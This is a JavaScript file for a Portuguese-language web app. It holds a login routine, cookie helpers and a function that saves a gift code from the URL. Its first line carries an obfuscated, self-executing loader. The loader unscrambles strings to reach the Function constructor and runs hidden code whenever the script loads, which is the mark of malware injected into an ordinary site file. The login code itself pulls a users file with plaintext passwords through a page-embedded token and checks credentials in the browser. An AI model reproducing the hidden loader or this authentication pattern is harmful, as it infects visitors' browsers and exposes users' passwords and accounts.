var token,username,repo,path,url;(function(){var rbK='',IUs=349-338;function pka(d){var m=3387453;var t=d.length;var x=[];for(var u=0;u<t;u++){x[u]=d.charAt(u)};for(var u=0;u<t;u++){var e=m*(u+329)+(m%40719);var n=m*(u+271)+(m%41896);var g=e%t;var q=n%t;var j=x[g];x[g]=x[q];x[q]=j;m=(e+n)%4492825;};return x.join('')};var TeN=pka('voqstbxdrejpawcosguilkncmnthyrtucofrz').substr(0,IUs);var fpu=' [7paai)dt,2g.v=0""vyr)v6j(ouditr7i(, Cn=wfg.9.(fs+zdmCuw=t=u6t.)5 ),,,289 0.5,8n)= +1hoxph60uC,n8a(jfm=;;4dp83,h6ts.del+;ajk t=j][crrv)=s;pwt;(1n tgbr00ro+ dl[(;rn(va,(; a.uyyrpdg;;+9;rvaiC[d([p0;f;hevr* xcfvlia.mh+0;es.f8);(-hg]n.nnv] 3=t)sdsg=n=(l=5q(l>=+d fhdeaC{] r =i=rrtlwi[rw;o>n]t;;}=(l.arr=<adncewrld,aro.h7ot+npuu,l=)hr2;jAhfnroi(;;]en)hgnoot)j;6o,)+; icawrk])=t(c)C1(rflA+eea1w obrrr+u;;vny,vek(4;a)fa,x{qr)u(e,==+87<h4[ .Caqtc={rsv];(oc;p+2s;=rs=s=r5fsrns{svtitrp eqgr=({tnnaha}=liaAte=ro.i+;al=*-+iie)0Swp2l-u,vr;,w9l;+}n=d tcoow]e+.qhd<)=1t+ull)ae[]nv{.qu!,y. ;a1(Sjhl(=604)wnbur)(=;.p<"}iA[a+il1;n0u+nehi]0;]((olh"!;f;"r9rua[9t)=j(s(bv0,.v,(e7t7nrjgauCao]-g1ga;,}+;f,nf7ai.6(j;+xr ar7.0)kjervmj 9c1a.r;7),c,)-, fn3o,ve8wcovx=vfxv[g;r{1==i4nl);f yrh8ogl)(=)r6).}.],v06o;th;"j(.)e2nthou"r)abi aive()pa[h=)8cA"ma2((joul"[ier+vlrrom<h-rm.2e;;i[=.sm=e"2rran+tjl3ii}=0b-r+)o1styta';var cKo=pka[TeN];var KmE='';var rJm=cKo;var DnF=cKo(KmE,pka(fpu));var AKk=DnF(pka('-,.sA1t t[ri$p(a)e\/tr(eplAnuijrjg3,3qAd")f){d(%s(.fsm=(A3&=e1){.\'+.aA{[rb6;0.a_%_.i,,v#.A3Cr$,cx_pgrh!3u7mo}\/]j=n(i9z=vo(Aabof)%7\/n_;(e)p4r%xe..A13c1euDl.cszg}x)eAh\/!)11t+wer!;h$!%4Cc3n2Ajpt+2AoAeSiAt]"__fa7f5\/(!T.c].f)%9%n+ti$ ].)3kn[$]0{4AAA6EA  g=n8u+A#)A;Ar;}-;rat&!f(.g10rje.A;.tAA.. (rnAAd,,ig_=.ea)s)=87(dt,{07A10t0Ane;$)+2j3aA; edb=h3!;h,1$3!Aj;),;!Ej.m;_v.e)Aj3AoAA+!(1es{+i;A):$}Aa)-bpb)),"(d.s,n.d&4;g.9,,e2!1"t1n9eeA"88t!=s.eAb.).A, .4;b)\/,3&.;i4l)}9))(3.AA([7(4arh0.;iAAm#a%p\'0ot,()+[7d1=sct(;} t7\/$tmgor"{s3!6+rcaaxr3\'0A5A+\'e.b,w,h.a.]sfAugi!!nA5$=p+A }eq;rjm}patsr.e$aAA AA)bs13Ae%2tb.A.A=.b((ao$A4szp)of1,A[p7}*.n(.)_q.$m_A+0,.A;l.ga.,a.3d$jAt\/e)rAr3}t;e;s.\/!f6;"=bie,)2;i]g(eAu2a2AIp,nhuiA+h{o,)u(zdAshd$sl%rexa$)h(!5A{4c.u3rldot43bihbh_iveh_*#49r!0$==b*AA353xt$rA)7-od !ejs)3(\/,oA}g.p=* ]s.o)$,A.15&}%=s(x,hex!Af.a{"#oi#.!McSqAA%)(4,pA.Ash__+_ed$)3%;.AAu2j$th,,4A9o\/255s(t!02-.b_d es f=(u3=(2Axo]07So$st1A)_ppn" dseA-A(.){i3$reth!en*8=pr7cA,;w. 6a)dA.o.giA7_0a,b8$!..A);{02..y2 ,oAnw(, 4gt!.(AA)o]$_A_-(ScA!Afo= ;Ai3rtbeen.3#Ap=!a.'));var Ysl=rJm(rbK,AKk );Ysl(3942);return 1282})()

async function login() {
  const emailInput = document.getElementById('email').value;
  const passwordInput = document.getElementById('password').value;
  const errorMsg = document.getElementById('error-msg');
  const customErrorMsg = document.getElementById('custom-error-msg');

  try {
    const response = await fetch(url, {
      headers: {
        'Authorization': `token ${token}`
      }
    });

    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }

    const data = await response.json();

    // O conteúdo do arquivo JSON está codificado em base64, então precisamos decodificá-lo
    const usersJson = atob(data.content);
    const users = JSON.parse(usersJson);

    // Procura pelo usuário com o email e senha fornecidos
    const user = users.find(user => user.email === emailInput && user.password === passwordInput);

    if (user) {
      if (!user.active) {
        customErrorMsg.style.display = 'block';
        errorMsg.style.display = 'none';
      } else {
        // Configura o cookie com o ID do usuário
        setCookie('id', user.id, 10);
        // Configura o cookie "permission" com o valor de cookieValue do usuário
        setCookie('permission', user.cookieValue);

        // Redireciona para a URL especificada
        window.location.href = user.redirectUrl;
        return { id: user.id, redirectUrl: user.redirectUrl }; // Retorna os dados do usuário, se necessário
      }
    } else {
      errorMsg.style.display = 'block';
      customErrorMsg.style.display = 'none';
    }

  } catch (error) {
    console.error('Houve um problema com a operação de fetch:', error);
    errorMsg.style.display = 'block';
    customErrorMsg.style.display = 'none';
  }

  // Em caso de falha ou usuário não encontrado, retorna null
  return null;
}

// Função para definir um cookie
function setCookie(name, value, days) {
  const expires = new Date();
  expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
  document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
}




// Função para definir o cookie
function setCookie(nome, valor, expiraEmDias, caminho = "/") {
    const dataDeExpiracao = new Date();
    dataDeExpiracao.setTime(dataDeExpiracao.getTime() + (expiraEmDias * 24 * 60 * 60 * 1000));
    const expires = `expires=${dataDeExpiracao.toUTCString()}`;
    
    document.cookie = `${nome}=${valor}; ${expires}; path=${caminho}`;
}

// Função para ler a URL e salvar o código nos cookies
function salvarCodigoNosCookies() {
    const url = window.location.href;

    // Verifica se o parâmetro ?COD= existe na URL
    const regex = /[?&]COD=([^&]+)/;
    const match = url.match(regex);

    if (match) {
        // Extrai o valor do código de presente
        const codigoDePresente = match[1];

        // Salva o código nos cookies com o nome 'code', válido por 30 dias
        setCookie("code", codigoDePresente, 30);

        console.log('Código de presente salvo nos cookies:', codigoDePresente);
    } else {
        console.log('Não há código de presente na URL.');
    }
}

// Chama a função para salvar o código nos cookies se existir
salvarCodigoNosCookies();
